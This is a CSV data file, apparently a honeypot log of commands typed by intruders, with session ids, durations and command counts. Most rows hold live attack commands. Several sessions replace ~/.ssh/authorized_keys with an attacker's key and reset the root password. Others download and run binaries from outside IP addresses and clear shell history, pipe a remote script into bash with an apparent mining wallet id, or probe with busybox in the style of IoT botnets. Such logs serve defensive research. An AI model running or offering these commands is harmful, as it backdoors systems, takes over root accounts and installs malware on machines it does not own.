,session,duration,command_freq,input
16593,4854d23e3ba3,18.841652870178223,15,uname -a
16594,4854d23e3ba3,18.841652870178223,15,lscpu | grep Model
16595,4854d23e3ba3,18.841652870178223,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16596,23d7b2e80a4f,3.807917833328247,15,cat /proc/cpuinfo | grep name | wc -l
16597,23d7b2e80a4f,3.807917833328247,15,"echo ""root:B4AN51f7O51r""|chpasswd|bash"
16598,23d7b2e80a4f,3.807917833328247,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16599,23d7b2e80a4f,3.807917833328247,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16600,23d7b2e80a4f,3.807917833328247,15,ls -lh $(which ls)
16601,23d7b2e80a4f,3.807917833328247,15,which ls
16602,23d7b2e80a4f,3.807917833328247,15,crontab -l
16603,23d7b2e80a4f,3.807917833328247,15,w
16604,23d7b2e80a4f,3.807917833328247,15,uname -m
16605,23d7b2e80a4f,3.807917833328247,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16606,23d7b2e80a4f,3.807917833328247,15,top
16607,23d7b2e80a4f,3.807917833328247,15,uname
16608,23d7b2e80a4f,3.807917833328247,15,uname -a
16609,23d7b2e80a4f,3.807917833328247,15,lscpu | grep Model
16610,23d7b2e80a4f,3.807917833328247,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16611,28f00fe0d2fb,6.665633201599121,15,cat /proc/cpuinfo | grep name | wc -l
16612,28f00fe0d2fb,6.665633201599121,15,"echo ""root:4GU6HB0FUcFL""|chpasswd|bash"
16613,28f00fe0d2fb,6.665633201599121,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16614,28f00fe0d2fb,6.665633201599121,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16615,28f00fe0d2fb,6.665633201599121,15,ls -lh $(which ls)
16616,28f00fe0d2fb,6.665633201599121,15,which ls
16617,28f00fe0d2fb,6.665633201599121,15,crontab -l
16618,28f00fe0d2fb,6.665633201599121,15,w
16619,28f00fe0d2fb,6.665633201599121,15,uname -m
16620,28f00fe0d2fb,6.665633201599121,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16621,28f00fe0d2fb,6.665633201599121,15,top
16622,28f00fe0d2fb,6.665633201599121,15,uname
16623,28f00fe0d2fb,6.665633201599121,15,uname -a
16624,28f00fe0d2fb,6.665633201599121,15,lscpu | grep Model
16625,28f00fe0d2fb,6.665633201599121,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16626,2ce9ca82bc64,17.845475912094116,18,cat /proc/cpuinfo | grep name | wc -l
16627,2ce9ca82bc64,17.845475912094116,18,"echo -e ""BageRoot123Hack\npu7OPmcTxiXw\npu7OPmcTxiXw""|passwd|bash"
16628,2ce9ca82bc64,17.845475912094116,18,Enter new UNIX password: 
16629,2ce9ca82bc64,17.845475912094116,18,Enter new UNIX password:
16630,2ce9ca82bc64,17.845475912094116,18,"echo ""BageRoot123Hack\npu7OPmcTxiXw\npu7OPmcTxiXw\n""|passwd"
16631,2ce9ca82bc64,17.845475912094116,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16632,2ce9ca82bc64,17.845475912094116,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16633,2ce9ca82bc64,17.845475912094116,18,ls -lh $(which ls)
16634,2ce9ca82bc64,17.845475912094116,18,which ls
16635,2ce9ca82bc64,17.845475912094116,18,crontab -l
16636,2ce9ca82bc64,17.845475912094116,18,w
16637,2ce9ca82bc64,17.845475912094116,18,uname -m
16638,2ce9ca82bc64,17.845475912094116,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16639,2ce9ca82bc64,17.845475912094116,18,top
16640,2ce9ca82bc64,17.845475912094116,18,uname
16641,2ce9ca82bc64,17.845475912094116,18,uname -a
16642,2ce9ca82bc64,17.845475912094116,18,lscpu | grep Model
16643,2ce9ca82bc64,17.845475912094116,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16644,ee21d3f1b2f3,17.96838641166687,18,cat /proc/cpuinfo | grep name | wc -l
16645,ee21d3f1b2f3,17.96838641166687,18,"echo -e ""123123\nYseooFDyXZOg\nYseooFDyXZOg""|passwd|bash"
16646,ee21d3f1b2f3,17.96838641166687,18,Enter new UNIX password: 
16647,ee21d3f1b2f3,17.96838641166687,18,Enter new UNIX password:
16648,ee21d3f1b2f3,17.96838641166687,18,"echo ""123123\nYseooFDyXZOg\nYseooFDyXZOg\n""|passwd"
16649,ee21d3f1b2f3,17.96838641166687,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16650,ee21d3f1b2f3,17.96838641166687,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16651,ee21d3f1b2f3,17.96838641166687,18,ls -lh $(which ls)
16652,ee21d3f1b2f3,17.96838641166687,18,which ls
16653,ee21d3f1b2f3,17.96838641166687,18,crontab -l
16654,ee21d3f1b2f3,17.96838641166687,18,w
16655,ee21d3f1b2f3,17.96838641166687,18,uname -m
16656,ee21d3f1b2f3,17.96838641166687,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16657,ee21d3f1b2f3,17.96838641166687,18,top
16658,ee21d3f1b2f3,17.96838641166687,18,uname
16659,ee21d3f1b2f3,17.96838641166687,18,uname -a
16660,ee21d3f1b2f3,17.96838641166687,18,lscpu | grep Model
16661,ee21d3f1b2f3,17.96838641166687,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16662,fc0c7ede6189,11.798887729644775,15,cat /proc/cpuinfo | grep name | wc -l
16663,fc0c7ede6189,11.798887729644775,15,"echo ""root:0TvS9zbipPSK""|chpasswd|bash"
16664,fc0c7ede6189,11.798887729644775,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16665,fc0c7ede6189,11.798887729644775,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16666,fc0c7ede6189,11.798887729644775,15,ls -lh $(which ls)
16667,fc0c7ede6189,11.798887729644775,15,which ls
16668,fc0c7ede6189,11.798887729644775,15,crontab -l
16669,fc0c7ede6189,11.798887729644775,15,w
16670,fc0c7ede6189,11.798887729644775,15,uname -m
16671,fc0c7ede6189,11.798887729644775,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16672,fc0c7ede6189,11.798887729644775,15,top
16673,fc0c7ede6189,11.798887729644775,15,uname
16674,fc0c7ede6189,11.798887729644775,15,uname -a
16675,fc0c7ede6189,11.798887729644775,15,lscpu | grep Model
16676,fc0c7ede6189,11.798887729644775,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16677,15a4a88d2ca4,14.399898290634155,18,cat /proc/cpuinfo | grep name | wc -l
16678,15a4a88d2ca4,14.399898290634155,18,"echo -e ""captain\n4ydNP5WaWaQk\n4ydNP5WaWaQk""|passwd|bash"
16679,15a4a88d2ca4,14.399898290634155,18,Enter new UNIX password: 
16680,15a4a88d2ca4,14.399898290634155,18,Enter new UNIX password:
16681,15a4a88d2ca4,14.399898290634155,18,"echo ""captain\n4ydNP5WaWaQk\n4ydNP5WaWaQk\n""|passwd"
16682,15a4a88d2ca4,14.399898290634155,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16683,15a4a88d2ca4,14.399898290634155,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16684,15a4a88d2ca4,14.399898290634155,18,ls -lh $(which ls)
16685,15a4a88d2ca4,14.399898290634155,18,which ls
16686,15a4a88d2ca4,14.399898290634155,18,crontab -l
16687,15a4a88d2ca4,14.399898290634155,18,w
16688,15a4a88d2ca4,14.399898290634155,18,uname -m
16689,15a4a88d2ca4,14.399898290634155,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16690,15a4a88d2ca4,14.399898290634155,18,top
16691,15a4a88d2ca4,14.399898290634155,18,uname
16692,15a4a88d2ca4,14.399898290634155,18,uname -a
16693,15a4a88d2ca4,14.399898290634155,18,lscpu | grep Model
16694,15a4a88d2ca4,14.399898290634155,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16695,a68394805e80,16.448063611984253,15,cat /proc/cpuinfo | grep name | wc -l
16696,a68394805e80,16.448063611984253,15,"echo ""root:z8P9z3UjEa7H""|chpasswd|bash"
16697,a68394805e80,16.448063611984253,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16698,a68394805e80,16.448063611984253,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16699,a68394805e80,16.448063611984253,15,ls -lh $(which ls)
16700,a68394805e80,16.448063611984253,15,which ls
16701,a68394805e80,16.448063611984253,15,crontab -l
16702,a68394805e80,16.448063611984253,15,w
16703,a68394805e80,16.448063611984253,15,uname -m
16704,a68394805e80,16.448063611984253,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16705,a68394805e80,16.448063611984253,15,top
16706,a68394805e80,16.448063611984253,15,uname
16707,a68394805e80,16.448063611984253,15,uname -a
16708,a68394805e80,16.448063611984253,15,lscpu | grep Model
16709,a68394805e80,16.448063611984253,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16710,319730ec39b1,13.356679677963257,15,cat /proc/cpuinfo | grep name | wc -l
16711,319730ec39b1,13.356679677963257,15,"echo ""root:Y1EbkAx2mK4J""|chpasswd|bash"
16712,319730ec39b1,13.356679677963257,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16713,319730ec39b1,13.356679677963257,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16714,319730ec39b1,13.356679677963257,15,ls -lh $(which ls)
16715,319730ec39b1,13.356679677963257,15,which ls
16716,319730ec39b1,13.356679677963257,15,crontab -l
16717,319730ec39b1,13.356679677963257,15,w
16718,319730ec39b1,13.356679677963257,15,uname -m
16719,319730ec39b1,13.356679677963257,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16720,319730ec39b1,13.356679677963257,15,top
16721,319730ec39b1,13.356679677963257,15,uname
16722,319730ec39b1,13.356679677963257,15,uname -a
16723,319730ec39b1,13.356679677963257,15,lscpu | grep Model
16724,319730ec39b1,13.356679677963257,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16725,0b10be42c9b0,6.22277045249939,1,uname -s -m
16726,309727fc5ebd,3.944039583206176,1,uname -s -m
16727,801067a2a96a,7.232692003250122,15,cat /proc/cpuinfo | grep name | wc -l
16728,801067a2a96a,7.232692003250122,15,"echo ""root:0XPh7KFE2EgM""|chpasswd|bash"
16729,801067a2a96a,7.232692003250122,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16730,801067a2a96a,7.232692003250122,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16731,801067a2a96a,7.232692003250122,15,ls -lh $(which ls)
16732,801067a2a96a,7.232692003250122,15,which ls
16733,801067a2a96a,7.232692003250122,15,crontab -l
16734,801067a2a96a,7.232692003250122,15,w
16735,801067a2a96a,7.232692003250122,15,uname -m
16736,801067a2a96a,7.232692003250122,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16737,801067a2a96a,7.232692003250122,15,top
16738,801067a2a96a,7.232692003250122,15,uname
16739,801067a2a96a,7.232692003250122,15,uname -a
16740,801067a2a96a,7.232692003250122,15,lscpu | grep Model
16741,801067a2a96a,7.232692003250122,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16742,4ecfb5fd23dc,10.225025653839111,1,cat /etc/issue; cd /tmp/; wget http://179.43.175.83/x86_64; chmod 777 x86_64; ./x86_64 x86xhed; history -c
16743,f43173ee04fd,2.98223328590393,13,enable
16744,f43173ee04fd,2.98223328590393,13,system
16745,f43173ee04fd,2.98223328590393,13,system
16746,f43173ee04fd,2.98223328590393,13,shell
16747,f43173ee04fd,2.98223328590393,13,shell
16748,f43173ee04fd,2.98223328590393,13,sh
16749,f43173ee04fd,2.98223328590393,13,cat /proc/mounts; /bin/busybox JLXSA
16750,f43173ee04fd,2.98223328590393,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JLXSA
16751,f43173ee04fd,2.98223328590393,13,tftp; wget; /bin/busybox JLXSA
16752,f43173ee04fd,2.98223328590393,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
16753,f43173ee04fd,2.98223328590393,13,while read i
16754,f43173ee04fd,2.98223328590393,13,/bin/busybox JLXSA
16755,f43173ee04fd,2.98223328590393,13,rm .s; exit
16756,c52e7b15b99e,62.06530570983887,3,uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
16757,c52e7b15b99e,62.06530570983887,3,lspci | grep -i --color vga\|3d\|2d
16758,c52e7b15b99e,62.06530570983887,3,curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
16759,76f57c9e3e13,2.627124309539795,13,enable
16760,76f57c9e3e13,2.627124309539795,13,system
16761,76f57c9e3e13,2.627124309539795,13,system
16762,76f57c9e3e13,2.627124309539795,13,shell
16763,76f57c9e3e13,2.627124309539795,13,shell
16764,76f57c9e3e13,2.627124309539795,13,sh
16765,76f57c9e3e13,2.627124309539795,13,cat /proc/mounts; /bin/busybox CLULR
16766,76f57c9e3e13,2.627124309539795,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CLULR
16767,76f57c9e3e13,2.627124309539795,13,tftp; wget; /bin/busybox CLULR
16768,76f57c9e3e13,2.627124309539795,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
16769,76f57c9e3e13,2.627124309539795,13,while read i
16770,76f57c9e3e13,2.627124309539795,13,/bin/busybox CLULR
16771,76f57c9e3e13,2.627124309539795,13,rm .s; exit
16772,981b4c360bd7,6.520601511001587,1,cat /etc/issue; cd /tmp/; wget http://179.43.175.83/x86_64; chmod 777 x86_64; ./x86_64 x86xhed; history -c
16773,34e8c813ad4c,17.01726269721985,1,cat /etc/issue; cd /tmp/; wget http://179.43.175.83/x86_64; chmod 777 x86_64; ./x86_64 x86xhed; history -c
16774,9782b90e7aee,0.412534952163696,1,scp -t /tmp/Mha7jpWj
16775,b7c27b9799fa,0.377151250839233,3,cd /tmp && chmod +x Mha7jpWj && bash -c ./Mha7jpWj
16776,b7c27b9799fa,0.377151250839233,3,./Mha7jpWj
16777,b7c27b9799fa,0.377151250839233,3,./Mha7jpWj
16778,08ebac1c4979,1.188647985458374,1,uname -s -v -n -r -m
16779,3157b7295a5e,1.222700834274292,13,enable
16780,3157b7295a5e,1.222700834274292,13,system
16781,3157b7295a5e,1.222700834274292,13,system
16782,3157b7295a5e,1.222700834274292,13,shell
16783,3157b7295a5e,1.222700834274292,13,shell
16784,3157b7295a5e,1.222700834274292,13,sh
16785,3157b7295a5e,1.222700834274292,13,cat /proc/mounts; /bin/busybox LCSBU
16786,3157b7295a5e,1.222700834274292,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LCSBU
16787,3157b7295a5e,1.222700834274292,13,tftp; wget; /bin/busybox LCSBU
16788,3157b7295a5e,1.222700834274292,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
16789,3157b7295a5e,1.222700834274292,13,while read i
16790,3157b7295a5e,1.222700834274292,13,/bin/busybox LCSBU
16791,3157b7295a5e,1.222700834274292,13,rm .s; exit
16792,b951759b99bd,3.176486730575561,2,User-Agent: libwww-perl/6.58
16793,b951759b99bd,3.176486730575561,2,User-Agent: libwww-perl/6.58
16794,d605a844bdfb,1.150551557540893,13,enable
16795,d605a844bdfb,1.150551557540893,13,system
16796,d605a844bdfb,1.150551557540893,13,system
16797,d605a844bdfb,1.150551557540893,13,shell
16798,d605a844bdfb,1.150551557540893,13,shell
16799,d605a844bdfb,1.150551557540893,13,sh
16800,d605a844bdfb,1.150551557540893,13,cat /proc/mounts; /bin/busybox YTFPP
16801,d605a844bdfb,1.150551557540893,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YTFPP
16802,d605a844bdfb,1.150551557540893,13,tftp; wget; /bin/busybox YTFPP
16803,d605a844bdfb,1.150551557540893,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
16804,d605a844bdfb,1.150551557540893,13,while read i
16805,d605a844bdfb,1.150551557540893,13,/bin/busybox YTFPP
16806,d605a844bdfb,1.150551557540893,13,rm .s; exit
16807,2f86f2f9264c,7.44718599319458,1,cat /etc/issue; cd /tmp/; wget http://179.43.175.83/x86_64; chmod 777 x86_64; ./x86_64 x86xhed; history -c
16808,b28d31e0f10c,4.8623597621917725,19,start
16809,b28d31e0f10c,4.8623597621917725,19,start
16810,b28d31e0f10c,4.8623597621917725,19,enable
16811,b28d31e0f10c,4.8623597621917725,19,config terminal
16812,b28d31e0f10c,4.8623597621917725,19,config terminal
16813,b28d31e0f10c,4.8623597621917725,19,system
16814,b28d31e0f10c,4.8623597621917725,19,system
16815,b28d31e0f10c,4.8623597621917725,19,linuxshell
16816,b28d31e0f10c,4.8623597621917725,19,linuxshell
16817,b28d31e0f10c,4.8623597621917725,19,su
16818,b28d31e0f10c,4.8623597621917725,19,shell
16819,b28d31e0f10c,4.8623597621917725,19,shell
16820,b28d31e0f10c,4.8623597621917725,19,sh
16821,b28d31e0f10c,4.8623597621917725,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
16822,b28d31e0f10c,4.8623597621917725,19,echo -ne \x45\x4c\x46
16823,b28d31e0f10c,4.8623597621917725,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
16824,b28d31e0f10c,4.8623597621917725,19,wget
16825,b28d31e0f10c,4.8623597621917725,19,echo -ne \x45\x4c\x46
16826,b28d31e0f10c,4.8623597621917725,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://120.85.175.72:43974/i; curl -O http://120.85.175.72:43974/i; /bin/busybox wget http://120.85.175.72:43974/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
16827,c091257d1a30,2.446027755737304,13,enable
16828,c091257d1a30,2.446027755737304,13,system
16829,c091257d1a30,2.446027755737304,13,system
16830,c091257d1a30,2.446027755737304,13,shell
16831,c091257d1a30,2.446027755737304,13,shell
16832,c091257d1a30,2.446027755737304,13,sh
16833,c091257d1a30,2.446027755737304,13,cat /proc/mounts; /bin/busybox UVYYA
16834,c091257d1a30,2.446027755737304,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UVYYA
16835,c091257d1a30,2.446027755737304,13,tftp; wget; /bin/busybox UVYYA
16836,c091257d1a30,2.446027755737304,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
